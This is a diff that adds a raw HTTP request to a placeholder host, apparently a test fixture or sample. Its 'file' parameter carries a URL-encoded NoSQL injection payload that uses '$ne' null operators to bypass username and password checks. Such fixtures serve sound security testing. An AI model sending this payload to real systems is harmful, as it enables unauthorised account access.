@@ -1,0 +1,4 @@
+GET /a?file=%7B%22%75%73%65%72%6E%61%6D%65%22%3A%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D%2C%22%70%61%73%73%77%6F%72%64%22%3A%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
